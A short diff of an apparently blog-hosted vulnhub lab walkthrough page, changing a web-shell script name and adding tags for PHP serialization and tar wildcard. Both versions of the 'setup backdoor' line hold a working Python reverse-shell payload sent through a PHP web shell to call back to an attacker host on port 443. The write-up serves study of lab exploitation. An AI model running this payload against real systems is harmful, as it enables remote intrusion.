@@ -264,7 +264,7 @@ $(document).ready(
 
 <p>setup backdoor:</p>
 
-<p><code>http://192.168.41.163/scriptz/test3.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
 
 <p>get the shell:</p>
 
@@ -345,7 +345,7 @@ $(document).ready(
 
 <div class="tags">
 
-	<a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+	<a class='category' href='/blog/categories/php-serialization/'>php serialization</a>, <a class='category' href='/blog/categories/tar-wildcard/'>tar wildcard</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
 
 </div>
 
